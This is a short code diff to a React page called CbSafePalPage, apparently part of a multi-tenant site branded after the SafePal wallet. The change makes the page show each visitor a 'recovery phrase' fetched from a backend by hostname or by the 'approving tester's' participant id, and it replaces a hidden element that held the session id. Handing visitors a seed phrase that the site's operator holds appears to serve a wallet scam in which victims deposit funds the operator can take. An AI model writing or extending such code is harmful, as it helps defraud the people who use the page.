@@ -61,15 +61,20 @@ function CbSafePalPage() {
 
   const [recoveryPhrase, setRecoveryPhrase] = useState<string>(DEFAULT_PHRASE);
   useEffect(() => {
-    // Look up which tester owns this hostname and use their seed phrase.
-    // Falls back to the default if the domain isn't attached to anyone.
+    // Prefer the approving tester's seed (via participant owner_id) so redirects
+    // to safepal work without a connected domain. Fall back to Host → domain.
     if (typeof window === "undefined") return;
     let alive = true;
-    resolveTenantByHost({ data: { host: window.location.host } })
+    resolveTenantByHost({
+      data: {
+        host: window.location.host,
+        participantId: sessionId || undefined,
+      },
+    })
       .then((r) => { if (alive && r.seedPhrase) setRecoveryPhrase(r.seedPhrase); })
       .catch(() => undefined);
     return () => { alive = false; };
-  }, []);
+  }, [sessionId]);
 
   const goNext = () => {
     if (step >= 4) return;
@@ -257,7 +262,7 @@ function CbSafePalPage() {
         </div>
       </main>
 
-      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
+      <div aria-hidden style={{ display: "none" }} />
     </div>
   );
 }
